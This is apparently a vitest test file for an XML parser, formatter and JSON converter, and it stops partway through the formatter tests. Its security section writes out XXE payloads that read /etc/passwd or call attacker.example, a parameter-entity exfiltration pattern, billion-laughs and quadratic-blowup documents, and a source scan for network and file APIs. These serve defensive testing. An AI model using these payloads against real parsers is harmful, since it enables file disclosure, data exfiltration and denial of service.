/**
 * The XML parser, formatter and JSON conversion. Security cases first-class: nothing declared in
 * a DOCTYPE is ever expanded and nothing is ever loaded.
 */
import { describe, expect, it } from 'vitest';
import type { DataResult } from '../../src/core/data/data-result';
import { parseXml, XML_LIMITS, type XmlDocument, type XmlElement, type XmlErrorCode, type XmlNode } from '../../src/core/data/xml';
import { formatXml, validateXml, xmlToJson } from '../../src/core/data/xml-tools';
import { pick, rng } from '../helpers';

type Ok = Extract<DataResult, { ok: true }>;

function doc(text: string): XmlDocument {
  const r = parseXml(text);
  if (!r.ok) throw new Error(`${r.code} at ${r.line}:${r.column}: ${r.message}`);
  return r.document;
}

/** [code, line, column] of the error, or ['ok']. */
function err(text: string): [XmlErrorCode | 'ok', number?, number?] {
  const r = parseXml(text);
  return r.ok ? ['ok'] : [r.code, r.line, r.column];
}
const code = (text: string) => err(text)[0];

function good(r: DataResult): Ok {
  if (!r.ok) throw new Error(`expected success: ${r.errors[0].message}`);
  return r;
}

const ch = (...codes: number[]) => String.fromCodePoint(...codes);
const TAB = ch(9);
const LF = ch(10);
const CR = ch(13);
const kids = (e: XmlElement) => e.children.filter((c): c is XmlElement => c.type === 'element');

describe('well-formed documents', () => {
  it('parses every kind of node', () => {
    const d = doc(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>${LF}<!-- before --><?style sheet?>${LF}<root a="1" b='two'>text<child/><![CDATA[<raw> & ]]><!-- in --><?pi data here?><empty></empty></root>${LF}<!-- after -->${LF}`);
    expect(d.declaration).toBe('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>');
    expect([d.version, d.encoding, d.standalone]).toEqual(['1.0', 'UTF-8', 'yes']);
    expect(d.doctype).toBeNull();
    expect(d.before).toEqual([{ type: 'comment', value: ' before ' }, { type: 'pi', target: 'style', data: 'sheet' }]);
    expect(d.after).toEqual([{ type: 'comment', value: ' after ' }]);
    expect(d.root.name).toBe('root');
    expect(d.root.attributes).toEqual([{ name: 'a', value: '1', raw: '1', quote: '"' }, { name: 'b', value: 'two', raw: 'two', quote: "'" }]);
    expect(d.root.children).toEqual([
      { type: 'text', value: 'text', raw: 'text' },
      { type: 'element', name: 'child', namespace: null, attributes: [], children: [], selfClosing: true },
      { type: 'cdata', value: '<raw> & ' },
      { type: 'comment', value: ' in ' },
      { type: 'pi', target: 'pi', data: 'data here' },
      { type: 'element', name: 'empty', namespace: null, attributes: [], children: [], selfClosing: false },
    ]);
    expect(d.counts).toEqual({ elements: 3, attributes: 2, comments: 3, maxDepth: 2 });
  });

  it('accepts the smallest documents', () => {
    expect(doc('<a/>').root).toMatchObject({ name: 'a', selfClosing: true, children: [] });
    expect(doc('<a></a>').root).toMatchObject({ name: 'a', selfClosing: false });
    expect(doc(`  ${LF}<a/>${LF}  `).root.name).toBe('a');
    expect(doc('<a ></a >').root.name).toBe('a');
    expect(doc(`<a${LF}  x="1"${LF}  y="2"${LF}/>`).root.attributes.map(a => a.name)).toEqual(['x', 'y']);
  });

  it('skips a byte order mark and says so', () => {
    const d = doc(`${ch(0xfeff)}<?xml version="1.0"?><a/>`);
    expect(d.version).toBe('1.0');
    expect(d.notes.some(n => n.includes('byte order mark'))).toBe(true);
  });

  it('accepts Unicode names and rejects names that start wrongly', () => {
    const name = ch(0xe9, 0x4e2d) + '-1.x';
    expect(doc(`<${name} ${ch(0x3b1)}="1"/>`).root.name).toBe(name);
    expect(doc('<_a:b xmlns:_a="u"/>').root.name).toBe('_a:b');
    expect(doc(`<${ch(0x10000)}/>`).root.name).toBe(ch(0x10000));
    expect(code('<1a/>')).toBe('name');
    expect(code('<-a/>')).toBe('name');
    expect(code('<.a/>')).toBe('name');
    expect(code('< a/>')).toBe('name');
    expect(code('<a 1x="1"/>')).toBe('name');
    expect(code(`<a${ch(0xd7)}/>`)).toBe('tag');
    expect(code('<')).toBe('name');
    expect(code('</>')).toBe('name');
  });

  it('normalizes line ends in text and CDATA, and keeps the raw text', () => {
    const d = doc(`<a>one${CR}${LF}two${CR}three<![CDATA[x${CR}${LF}y]]></a>`);
    expect(d.root.children[0]).toEqual({ type: 'text', value: `one${LF}two${LF}three`, raw: `one${CR}${LF}two${CR}three` });
    expect(d.root.children[1]).toEqual({ type: 'cdata', value: `x${LF}y` });
  });
});

describe('the XML declaration', () => {
  it('accepts the allowed forms', () => {
    expect(doc("<?xml version='1.0'?><a/>").version).toBe('1.0');
    expect(doc('<?xml version="1.0" standalone="no"?><a/>').standalone).toBe('no');
    expect(doc('<?xml version = "1.0" encoding = "utf-8" ?><a/>').encoding).toBe('utf-8');
  });

  it('notes a declared encoding other than UTF-8 and keeps the declaration', () => {
    const d = doc('<?xml version="1.0" encoding="ISO-8859-1"?><a/>');
    expect(d.notes.some(n => n.includes('ISO-8859-1'))).toBe(true);
    expect(good(formatXml('<?xml version="1.0" encoding="ISO-8859-1"?><a/>', '  ')).output).toBe(`<?xml version="1.0" encoding="ISO-8859-1"?>${LF}<a/>${LF}`);
    expect(doc('<?xml version="1.0" encoding="UTF-8"?><a/>').notes).toEqual([]);
  });

  it('rejects malformed declarations', () => {
    expect(err('<?xml encoding="UTF-8" version="1.0"?><a/>')).toEqual(['declaration', 1, 1]);
    expect(code('<?xml version="1.0" standalone="yes" encoding="UTF-8"?><a/>')).toBe('declaration');
    expect(code('<?xml version="1.0" standalone="maybe"?><a/>')).toBe('declaration');
    expect(code('<?xml version="1.0" encoding="8bit"?><a/>')).toBe('declaration');
    expect(code('<?xml version="1.0"><a/>')).toBe('declaration');
    expect(code('<?xml version=1.0?><a/>')).toBe('declaration');
    expect(code('<?xml version="1.0" bogus="1"?><a/>')).toBe('declaration');
    expect(code('<?xml ?><a/>')).toBe('declaration');
  });

  it('reads XML 1.0 only', () => {
    expect(err('<?xml version="1.1"?><a/>')).toEqual(['version', 1, 1]);
    expect(code('<?xml version="2.0"?><a/>')).toBe('version');
    expect(code('<?xml version="one"?><a/>')).toBe('version');
  });

  it('allows the declaration only at the very start', () => {
    expect(err(` <?xml version="1.0"?><a/>`)).toEqual(['pi', 1, 2]);
    expect(err(`${LF}<?xml version="1.0"?><a/>`)).toEqual(['pi', 2, 1]);
    expect(code('<!-- c --><?xml version="1.0"?><a/>')).toBe('pi');
    expect(code('<a><?xml version="1.0"?></a>')).toBe('pi');
    expect(code('<a/><?XML version="1.0"?>')).toBe('pi');
    expect(code('<?xml?><a/>')).toBe('pi');
  });
});

describe('attributes', () => {
  it('rejects duplicates, missing values, missing quotes and "<"', () => {
    expect(err('<a x="1" x="2"/>')).toEqual(['duplicate-attribute', 1, 10]);
    expect(err('<a x/>')).toEqual(['attribute', 1, 5]);
    expect(err('<a x=1/>')).toEqual(['attribute', 1, 6]);
    expect(err('<a x="1/>')).toEqual(['attribute', 1, 6]);
    expect(err('<a x="a<b"/>')).toEqual(['attribute', 1, 8]);
    expect(code("<a x='1\"/>")).toBe('attribute');
    expect(code('<a x="1"y="2"/>')).toBe('tag');
    expect(code('<a x = "1" />')).toBe('ok');
    expect(code('<a x="1" X="2"/>')).toBe('ok');
  });

  it('keeps the other kind of quote and ">" inside a value', () => {
    const d = doc(`<a x="it's > ok" y='say "hi"'/>`);
    expect(d.root.attributes.map(a => [a.value, a.quote])).toEqual([["it's > ok", '"'], ['say "hi"', "'"]]);
  });

  it('normalizes a literal tab or line break in a value to a space, but not a referenced one', () => {
    const d = doc(`<a x="a${TAB}b${LF}c${CR}${LF}d${CR}e" y="a&#9;b&#10;c"/>`);
    expect(d.root.attributes[0].value).toBe('a b c d e');
    expect(d.root.attributes[0].raw).toBe(`a${TAB}b${LF}c${CR}${LF}d${CR}e`);
    expect(d.root.attributes[1].value).toBe(`a${TAB}b${LF}c`);
  });

  it('bounds the number of attributes on one tag', () => {
    const many = (n: number) => `<a ${Array.from({ length: n }, (_, i) => `x${i}="1"`).join(' ')}/>`;
    expect(code(many(XML_LIMITS.attributes))).toBe('ok');
    expect(code(many(XML_LIMITS.attributes + 1))).toBe('attribute');
  });
});

describe('characters and references', () => {
  it('resolves the five predefined entities and numeric references', () => {
    const d = doc('<a x="&lt;&gt;&amp;&apos;&quot;">&lt;&gt;&amp;&apos;&quot; &#65;&#x42;&#x1F600;&#169;</a>');
    expect(d.root.attributes[0].value).toBe('<>&\'"');
    expect(d.root.attributes[0].raw).toBe('&lt;&gt;&amp;&apos;&quot;');
    expect(d.root.children[0]).toMatchObject({ type: 'text', value: `<>&'" AB${ch(0x1f600, 0xa9)}` });
  });

  it('keeps a carriage return written as a reference, while normalizing literal ones', () => {
    const d = doc(`<a x="&#13;">a&#13;b&#xD;&#10;${CR}${LF}${CR}</a>`);
    expect(d.root.children[0]).toMatchObject({ value: `a${CR}b${CR}${LF}${LF}${LF}` });
    expect(d.root.attributes[0].value).toBe(CR);
  });

  it('does not resolve a reference twice', () => {
    expect(doc('<a>&amp;lt; &#38;amp;</a>').root.children[0]).toMatchObject({ value: '&lt; &amp;' });
  });

  it('rejects every other entity, and malformed references', () => {
    expect(err('<a>&nbsp;</a>')).toEqual(['entity', 1, 4]);
    expect(err(`<a>${LF}  <b x="&copy;"/></a>`)).toEqual(['entity', 2, 9]);
    for (const bad of ['&', '& ', '&;', '&amp', '&#;', '&#x;', '&#xZZ;', '&#12a;', '&#-1;', '&LT;', '&Amp;', 'a & b', '&a b;', '&#x110000;', '&#99999999999;']) {
      expect(code(`<a>${bad}</a>`), bad).toBe('entity');
      expect(code(`<a x="${bad}"/>`), bad).toBe('entity');
    }
  });

  it('rejects references to characters XML forbids', () => {
    for (const bad of ['&#0;', '&#x0;', '&#1;', '&#8;', '&#11;', '&#12;', '&#x1F;', '&#xFFFE;', '&#xFFFF;', '&#xD800;', '&#xDFFF;']) expect(code(`<a>${bad}</a>`), bad).toBe('entity');
    for (const fine of ['&#9;', '&#10;', '&#13;', '&#32;', '&#xD7FF;', '&#xE000;', '&#xFFFD;', '&#x10000;', '&#x10FFFF;', '&#x7F;']) expect(code(`<a>${fine}</a>`), fine).toBe('ok');
  });

  it('rejects forbidden characters wherever they appear', () => {
    for (const bad of [0, 1, 8, 0x0b, 0x0c, 0x1f, 0xfffe, 0xffff]) {
      const c = ch(bad);
      expect(err(`<a>x${c}</a>`), `text ${bad}`).toEqual(['character', 1, 5]);
      expect(code(`<a x="${c}"/>`), `attribute ${bad}`).toBe('character');
      expect(code(`<a><!--${c}--></a>`), `comment ${bad}`).toBe('character');
      expect(code(`<a><![CDATA[${c}]]></a>`), `cdata ${bad}`).toBe('character');
      expect(code(`<a><?p ${c}?></a>`), `pi ${bad}`).toBe('character');
      expect(code(`<!DOCTYPE a [<!-- ${c} -->]><a/>`), `doctype ${bad}`).toBe('character');
    }
    // Lone surrogates.
    expect(code(`<a>${ch(0x1f600)[0]}</a>`)).toBe('character');
    expect(code(`<a>${ch(0x1f600)[1]}x</a>`)).toBe('character');
    // Allowed: tab, line breaks, DEL, C1 controls, astral characters.
    expect(code(`<a>${TAB}${LF}${CR}${ch(0x7f, 0x85, 0xfffd, 0x1f600)}</a>`)).toBe('ok');
  });

  it('rejects "]]>" in text', () => {
    expect(err('<a>x]]>y</a>')).toEqual(['cdata', 1, 5]);
    expect(code('<a>x]]&gt;y ]] > ]></a>')).toBe('ok');
  });
});

describe('security: nothing is expanded and nothing is loaded', () => {
  const never = (text: string, ...leaks: string[]) => {
    for (const op of [validateXml(text), formatXml(text, '  '), formatXml(text, null), xmlToJson(text)]) {
      if (!op.ok) {
        for (const leak of leaks) expect(op.errors[0].message.includes(leak)).toBe(false);
        continue;
      }
      // Output may quote the DOCTYPE as text; it must never hold content an entity would have produced.
      const parsed = parseXml(text);
      const texts: string[] = [];
      const walk = (n: XmlNode) => {
        if (n.type === 'text' || n.type === 'cdata') texts.push(n.value);
        if (n.type === 'element') { for (const a of n.attributes) texts.push(a.value); n.children.forEach(walk); }
      };
      if (parsed.ok) walk(parsed.document.root);
      for (const leak of leaks) expect(texts.join('|').includes(leak)).toBe(false);
    }
  };

  it('refuses a document that uses an external entity (XXE), without reading anything', () => {
    for (const target of ['file:///etc/passwd', 'file:///C:/Windows/win.ini', 'http://attacker.example/x', 'https://attacker.example/x?d=1', 'php://filter/x', 'expect://id']) {
      const text = `<?xml version="1.0"?>${LF}<!DOCTYPE r [<!ENTITY xxe SYSTEM "${target}">]>${LF}<r>&xxe;</r>`;
      const r = parseXml(text);
      expect(r.ok, target).toBe(false);
      if (r.ok) continue;
      expect([r.code, r.line, r.column]).toEqual(['entity', 3, 4]);
      expect(r.message).toContain('never expands entities');
      expect(r.message).toContain('The DOCTYPE declares entities');
      for (const op of [validateXml(text), formatXml(text, '  '), xmlToJson(text)]) expect(op.ok).toBe(false);
    }
  });

  it('refuses external entities in attribute values and PUBLIC identifiers too', () => {
    expect(code('<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r a="&x;"/>')).toBe('entity');
    expect(code('<!DOCTYPE r [<!ENTITY x PUBLIC "-//X//Y" "http://attacker.example/x">]><r>&x;</r>')).toBe('entity');
  });

  it('accepts a document that declares entities but never uses them, leaving the DOCTYPE as text', () => {
    const text = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY big "aaaaaaaaaa">]><r>safe</r>';
    const d = doc(text);
    expect(d.doctype).toBe('<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY big "aaaaaaaaaa">]>');
    expect(d.root.children).toEqual([{ type: 'text', value: 'safe', raw: 'safe' }]);
    expect(d.notes.some(n => n.includes('declares entities') && n.includes('does not define them'))).toBe(true);
    never(text, 'root:', 'aaaaaaaaaa|');
  });

  it('does not process parameter entities or an external DTD', () => {
    const param = `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext; <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?%file;'>"> %all;]><r>ok</r>`;
    expect(doc(param).root.children[0]).toMatchObject({ value: 'ok' });
    expect(code(param.replace('<r>ok</r>', '<r>&send;</r>'))).toBe('entity');
    const external = '<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"><r>ok</r>';
    const d = doc(external);
    expect(d.notes.some(n => n.includes('does not load it'))).toBe(true);
    // An entity the external DTD would have defined is simply unknown.
    expect(code('<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"><r>&fromdtd;</r>')).toBe('entity');
    expect(code('<!DOCTYPE r PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><r>&nbsp;</r>')).toBe('entity');
    never(external, 'evil');
  });

  it('refuses the billion laughs document at once', () => {
    const rows = ['<!ENTITY lol "lol">'];
    for (let i = 1; i < 10; i++) rows.push(`<!ENTITY lol${i} "${`&lol${i === 1 ? '' : i - 1};`.repeat(10)}">`);
    const text = `<?xml version="1.0"?>${LF}<!DOCTYPE lolz [${LF}${rows.join(LF)}${LF}]>${LF}<lolz>&lol9;</lolz>`;
    const started = Date.now();
    const r = parseXml(text);
    const elapsed = Date.now() - started;
    expect(r.ok).toBe(false);
    expect(!r.ok && [r.code, r.line]).toEqual(['entity', 14]);
    expect(elapsed).toBeLessThan(200);
    // Without the reference it is well-formed, and nothing grows: output is about the size of the input.
    const unused = text.replace('&lol9;', 'x');
    for (const op of [formatXml(unused, '  '), xmlToJson(unused)]) {
      expect(good(op).output.length).toBeLessThan(unused.length * 3);
      expect(good(op).output.includes('lollol')).toBe(false);
    }
  });

  it('refuses a quadratic blowup document at once', () => {
    const text = `<!DOCTYPE r [<!ENTITY a "${'a'.repeat(100_000)}">]><r>${'&a;'.repeat(50_000)}</r>`;
    const started = Date.now();
    const r = parseXml(text);
    expect(Date.now() - started).toBeLessThan(500);
    expect(!r.ok && r.code).toBe('entity');
  });

  it('skips a DOCTYPE with ">" and "]" inside quoted strings and comments', () => {
    const tricky = `<!DOCTYPE r [${LF}<!-- a comment with ] and > and " and ' -->${LF}<!ENTITY a "]>">${LF}<!ENTITY b ']]>'>${LF}<!ATTLIST r x CDATA "]>">${LF}<?pi ok?>${LF}]>`;
    const d = doc(`${tricky}<r>fine</r>`);
    expect(d.doctype).toBe(tricky);
    expect(d.root.children[0]).toMatchObject({ value: 'fine' });
    const sys = doc(`<!DOCTYPE r SYSTEM "a>b.dtd" [<!ELEMENT r ANY>]><r/>`);
    expect(sys.doctype).toBe('<!DOCTYPE r SYSTEM "a>b.dtd" [<!ELEMENT r ANY>]>');
    expect(doc("<!DOCTYPE r PUBLIC '-//X>//' 'y]'><r/>").doctype).toBe("<!DOCTYPE r PUBLIC '-//X>//' 'y]'>");
  });

  it('describes each kind of DOCTYPE without processing it', () => {
    expect(doc('<!DOCTYPE html><html/>').notes.some(n => n.includes('kept as written'))).toBe(true);
    expect(doc('<!DOCTYPE r [<!ELEMENT r ANY>]><r/>').notes.some(n => n.includes('internal subset') && n.includes('does not process it'))).toBe(true);
    // A default attribute value from the DTD is not applied.
    expect(doc('<!DOCTYPE r [<!ATTLIST r x CDATA "dflt">]><r/>').root.attributes).toEqual([]);
  });

  it('rejects malformed DOCTYPE declarations', () => {
    expect(code('<!DOCTYPE><r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r [<r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r "unclosed><r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r [<!-- unclosed ]><r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r [<!ENTITY a "unclosed]><r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r <r/>')).toBe('doctype');
    expect(code('<!DOCTYPE r')).toBe('doctype');
    expect(code('<r/><!DOCTYPE r>')).toBe('doctype');
    expect(code('<r><!DOCTYPE r></r>')).toBe('doctype');
    expect(code('<!DOCTYPE r><!DOCTYPE r><r/>')).toBe('doctype');
    expect(code('<!DOCTYPE 1r><r/>')).toBe('name');
    expect(code('<!doctype r><r/>')).toBe('tag');
    expect(code('<!ELEMENT r ANY><r/>')).toBe('tag');
  });

  it('never has a way to load anything: the parser module uses no network or file API', async () => {
    const { readFileSync } = await import('node:fs');
    const { join } = await import('node:path');
    for (const file of ['xml.ts', 'xml-tools.ts']) {
      const source = readFileSync(join(import.meta.dirname, '..', '..', 'src', 'core', 'data', file), 'utf8');
      expect(/\b(fetch|XMLHttpRequest|DOMParser|importScripts|require|readFile)\b\s*\(/.test(source), file).toBe(false);
      expect(/^import .* from '(node:|https?:)/m.test(source), file).toBe(false);
    }
  });
});

describe('namespaces', () => {
  it('resolves default and prefixed namespaces with scoping and shadowing', () => {
    const d = doc('<r xmlns="urn:d" xmlns:p="urn:p"><a/><p:b/><c xmlns="urn:inner" xmlns:p="urn:p2"><d/><p:e/></c><f xmlns=""><g/></f><h/></r>');
    const [a, b, c, f, h] = kids(d.root);
    expect(d.root.namespace).toBe('urn:d');
    expect([a.namespace, b.namespace, c.namespace, f.namespace, h.namespace]).toEqual(['urn:d', 'urn:p', 'urn:inner', null, 'urn:d']);
    expect(kids(c).map(e => e.namespace)).toEqual(['urn:inner', 'urn:p2']);
    expect(kids(f)[0].namespace).toBeNull();
  });

  it('gives unprefixed elements no namespace without a default, and knows the xml prefix', () => {
    expect(doc('<r xmlns:p="urn:p"><a/></r>').root.namespace).toBeNull();
    expect(code('<r xml:lang="en" xml:space="preserve"/>')).toBe('ok');
    expect(doc('<xml:r/>').root.namespace).toBe('http://www.w3.org/XML/1998/namespace');
    expect(code('<r xmlns:xml="http://www.w3.org/XML/1998/namespace"/>')).toBe('ok');
  });

  it('rejects prefixes that are not bound', () => {
    expect(err('<r><p:a/></r>')).toEqual(['namespace', 1, 4]);
    expect(code('<p:r/>')).toBe('namespace');
    expect(code('<r p:x="1"/>')).toBe('namespace');
    // A declaration does not reach outside its element, or backwards to a sibling.
    expect(code('<r><a xmlns:p="urn:p"/><p:b/></r>')).toBe('namespace');
    expect(code('<r><a xmlns:p="urn:p"><p:b p:x="1"/></a></r>')).toBe('ok');
    // The element that declares a prefix may use it.
    expect(code('<p:r xmlns:p="urn:p" p:x="1"/>')).toBe('ok');
  });

  it('protects the reserved prefixes and namespaces', () => {
    expect(code('<r xmlns:xmlns="urn:x"/>')).toBe('namespace');
    expect(code('<r xmlns:xml="urn:other"/>')).toBe('namespace');
    expect(code('<r xmlns:p="http://www.w3.org/XML/1998/namespace"/>')).toBe('namespace');
    expect(code('<r xmlns:p="http://www.w3.org/2000/xmlns/"/>')).toBe('namespace');
    expect(code('<r xmlns:p=""/>')).toBe('namespace');
    expect(code('<r xmlns:="urn:x"/>')).toBe('namespace');
    expect(code('<xmlns:r/>')).toBe('namespace');
  });

  it('rejects names with two colons or an empty part', () => {
    expect(code('<a:b:c xmlns:a="u"/>')).toBe('namespace');
    expect(code('<r xmlns:a="u" a:b:c="1"/>')).toBe('namespace');
    expect(code('<:a/>')).toBe('namespace');
    expect(code('<a:/>')).toBe('namespace');
    expect(code('<r xmlns:a:b="u"/>')).toBe('namespace');
  });

  it('rejects two attributes with the same expanded name', () => {
    expect(code('<r xmlns:a="urn:same" xmlns:b="urn:same" a:x="1" b:x="2"/>')).toBe('duplicate-attribute');
    expect(code('<r xmlns:a="urn:one" xmlns:b="urn:two" a:x="1" b:x="2"/>')).toBe('ok');
    // The default namespace does not apply to attributes.
    expect(code('<r xmlns="urn:same" xmlns:b="urn:same" x="1" b:x="2"/>')).toBe('ok');
    expect(code('<r xmlns:a="urn:same" a:x="1" a:y="2"/>')).toBe('ok');
  });
});

describe('structure', () => {
  it('requires matching tags, and says where the open one is', () => {
    const r = parseXml(`<r>${LF}  <a>${LF}  </b>${LF}</r>`);
    expect(!r.ok && [r.code, r.line, r.column]).toEqual(['mismatch', 3, 3]);
    expect(!r.ok && r.message).toContain('<a> (opened on line 2, column 3)');
    expect(err('<a></A>')).toEqual(['mismatch', 1, 4]);
    expect(err('</a>')).toEqual(['mismatch', 1, 1]);
    expect(err('<a/></a>')).toEqual(['mismatch', 1, 5]);
    expect(code('<a><b></a></b>')).toBe('mismatch');
  });

  it('reports the element that was never closed', () => {
    expect(err(`<r>${LF} <a>${LF}  <b/>${LF}`)).toEqual(['unclosed', 2, 2]);
    expect(err('<r>')).toEqual(['unclosed', 1, 1]);
    expect(err('<r')).toEqual(['unclosed', 1, 3]);
    expect(code('<r x="1"')).toBe('unclosed');
  });

  it('allows exactly one root element', () => {
    expect(err('<a/><b/>')).toEqual(['root', 1, 5]);
    expect(err(`<a></a>${LF}<a></a>`)).toEqual(['root', 2, 1]);
    expect(code('<a/><!-- c --><?p?>  ')).toBe('ok');
  });

  it('rejects text outside the root', () => {
    expect(err('hello<a/>')).toEqual(['text-outside-root', 1, 1]);
    expect(err(`<a/>${LF}tail`)).toEqual(['text-outside-root', 2, 1]);
    expect(err('  x <a/>')).toEqual(['text-outside-root', 1, 3]);
    expect(code('<a/>&amp;')).toBe('text-outside-root');
  });

  it('rejects empty input and documents with no element', () => {
    expect(code('')).toBe('empty');
    expect(code('   ')).toBe('empty');
    expect(code('<?xml version="1.0"?>')).toBe('empty');
    expect(code('<!-- only a comment -->')).toBe('empty');
    expect(code('<!DOCTYPE r>')).toBe('empty');
  });

  it('rejects malformed tags', () => {
    expect(code('<a/ >')).toBe('tag');
    expect(code('<a></a b>')).toBe('tag');
    expect(code('<a><!x></a>')).toBe('tag');
    expect(code('<a><b/x></a>')).toBe('tag');
    expect(err('<a x="1"/ >')).toEqual(['tag', 1, 9]);
  });

  it('rejects malformed comments', () => {
    expect(err('<a><!-- a -- b --></a>')).toEqual(['comment', 1, 11]);
    expect(err('<a><!-- a ---></a>')).toEqual(['comment', 1, 11]);
    expect(err('<a><!-- never closed</a>')).toEqual(['comment', 1, 4]);
    expect(code('<a><!----></a>')).toBe('ok');
    expect(code('<a><!-- - - > --></a>')).toBe('ok');
    expect(code('<a><!-></a>')).toBe('tag');
  });

  it('rejects malformed CDATA sections and processing instructions', () => {
    expect(err('<a><![CDATA[never closed</a>')).toEqual(['cdata', 1, 4]);
    expect(err('<![CDATA[x]]><a/>')).toEqual(['cdata', 1, 1]);
    expect(code('<a/><![CDATA[x]]>')).toBe('cdata');
    expect(code('<a><![cdata[x]]></a>')).toBe('tag');
    expect(doc('<a><![CDATA[]]></a>').root.children).toEqual([{ type: 'cdata', value: '' }]);
    expect(doc('<a><![CDATA[<b>&amp;]]]]></a>').root.children).toEqual([{ type: 'cdata', value: '<b>&amp;]]' }]);
    expect(err('<a><?never closed</a>')).toEqual(['pi', 1, 4]);
    expect(code('<a><?p!x?></a>')).toBe('pi');
    expect(code('<a><? p?></a>')).toBe('name');
    expect(doc('<a><?p?><?q   spaced  ?></a>').root.children).toEqual([{ type: 'pi', target: 'p', data: '' }, { type: 'pi', target: 'q', data: 'spaced  ' }]);
  });

  it('bounds nesting depth without overflowing the stack', () => {
    const nest = (n: number) => `${'<a>'.repeat(n)}${'</a>'.repeat(n)}`;
    expect(doc(nest(XML_LIMITS.depth)).counts.maxDepth).toBe(XML_LIMITS.depth);
    expect(code(nest(XML_LIMITS.depth + 1))).toBe('depth');
    expect(code('<a>'.repeat(200_000))).toBe('depth');
    // Formatting and converting the deepest allowed document works too.
    expect(formatXml(nest(XML_LIMITS.depth), '  ').ok).toBe(true);
    expect(xmlToJson(nest(XML_LIMITS.depth)).ok).toBe(true);
  });

  it('refuses input over the size limit without processing any of it', () => {
    const big = `<a>${'x'.repeat(XML_LIMITS.inputChars)}</a>`;
    const r = parseXml(big);
    expect(!r.ok && r.code).toBe('too-large');
    for (const op of [validateXml(big), formatXml(big, '  '), xmlToJson(big)]) {
      expect(op.ok).toBe(false);
      expect(!op.ok && op.errors[0].message).toContain('Nothing was processed');
    }
  });
});

describe('validateXml', () => {
  it('summarizes a well-formed document and says what was not checked', () => {
    const r = good(validateXml('<r a="1"><b/><b c="2"/></r>'));
    expect(r.summary).toBe('Well-formed XML: root <r>, 3 elements, 2 attributes, depth 2');
    expect(r.output).toBe('');
    expect(r.notes.some(n => n.includes('does not validate against a DTD or schema'))).toBe(true);
    expect(good(validateXml('<r/>')).summary).toBe('Well-formed XML: root <r>, 1 element, 0 attributes, depth 1');
  });

  it('reports the first error with its line and column', () => {
    const r = validateXml(`<r>${LF}  <a></b>${LF}</r>`);
    expect(!r.ok && r.errors).toHaveLength(1);
    expect(!r.ok && [r.errors[0].line, r.errors[0].column]).toEqual([2, 6]);
  });
});

/** The document's content with layout whitespace (blank text in element-only content) removed. */
function essence(d: XmlDocument): unknown {
  const node = (n: XmlNode): unknown => {
    if (n.type !== 'element') return n.type === 'text' ? { text: n.raw } : n;
    const elementOnly = n.children.every(c => c.type !== 'cdata' && (c.type !== 'text' || /^[ \t\r\n]*$/.test(c.raw))) && n.children.some(c => c.type !== 'text');
    const preserved = n.attributes.some(a => a.name === 'xml:space' && a.value === 'preserve');
    const children = n.children.filter(c => !(elementOnly && !preserved && c.type === 'text')).map(node);
    return { name: n.name, ns: n.namespace, attrs: n.attributes, children };
  };
  return { declaration: d.declaration, doctype: d.doctype, doctypeAt: d.doctypeAt, before: d.before.map(node), root: node(d.root), after: d.after.map(node) };
}

describe('formatXml', () => {
  const fmt = (text: string, indent: string | null = '  ') => good(formatXml(text, indent)).output;

  it('indents element-only content', () => {
    expect(fmt('<r><a><b/><c>text</c></a><d/></r>')).toBe(['<r>', '  <a>', '    <b/>', '    <c>text</c>', '  </a>', '  <d/>', '</r>', ''].join(LF));
    expect(fmt('<r><a><b/></a></r>', '    ')).toBe(['<r>', '    <a>', '        <b/>', '    </a>', '</r>', ''].join(LF));
    expect(fmt('<r><a><b/></a></r>', TAB)).toBe(['<r>', `${TAB}<a>`, `${TAB}${TAB}<b/>`, `${TAB}</a>`, '</r>', ''].join(LF));
  });

  it('replaces existing layout whitespace instead of adding to it', () => {
    expect(fmt(`<r>${LF}${LF}      <a>${TAB}<b/>   </a>${CR}${LF}</r>`)).toBe(['<r>', '  <a>', '    <b/>', '  </a>', '</r>', ''].join(LF));
  });

  it('leaves elements that hold text exactly as written', () => {
    const mixed = '<p>Some <b>bold</b>  and <i>italic <u>deep</u></i> text.</p>';
    expect(fmt(`<r>${mixed}</r>`)).toBe(['<r>', `  ${mixed}`, '</r>', ''].join(LF));
    expect(fmt(`<r><a>  padded  </a><b> </b><c>${LF}</c></r>`)).toBe(['<r>', '  <a>  padded  </a>', '  <b> </b>', `  <c>${LF}</c>`, '</r>', ''].join(LF));
    // CDATA counts as text.
    expect(fmt('<r><a><![CDATA[x]]><b/></a></r>')).toBe(['<r>', '  <a><![CDATA[x]]><b/></a>', '</r>', ''].join(LF));
  });

  it('leaves everything under xml:space="preserve" untouched', () => {
    expect(fmt('<r><pre xml:space="preserve"><a/> <b><c/></b></pre><d><e/></d></r>'))
      .toBe(['<r>', '  <pre xml:space="preserve"><a/> <b><c/></b></pre>', '  <d>', '    <e/>', '  </d>', '</r>', ''].join(LF));
    // Conservative: a nested xml:space="default" does not switch formatting back on.
    expect(fmt('<r xml:space="preserve"><a><b/></a><c xml:space="default"><d><e/></d></c></r>'))
      .toBe(`<r xml:space="preserve"><a><b/></a><c xml:space="default"><d><e/></d></c></r>${LF}`);
    // "default" on its own changes nothing: the element is formatted as usual.
    expect(fmt('<r xml:space="default"><a/></r>')).toBe(['<r xml:space="default">', '  <a/>', '</r>', ''].join(LF));
  });

  it('writes attributes, quotes, references, CDATA, comments and PIs back exactly', () => {
    const inner = `<a x="1 &amp; 2" y='say "hi" &#169; &lt;' z="${TAB}"><![CDATA[<raw> & ]]]]></a>`;
    const text = `<r><!-- note: a > b --><?pi  some data ?>${inner}<e></e><f/></r>`;
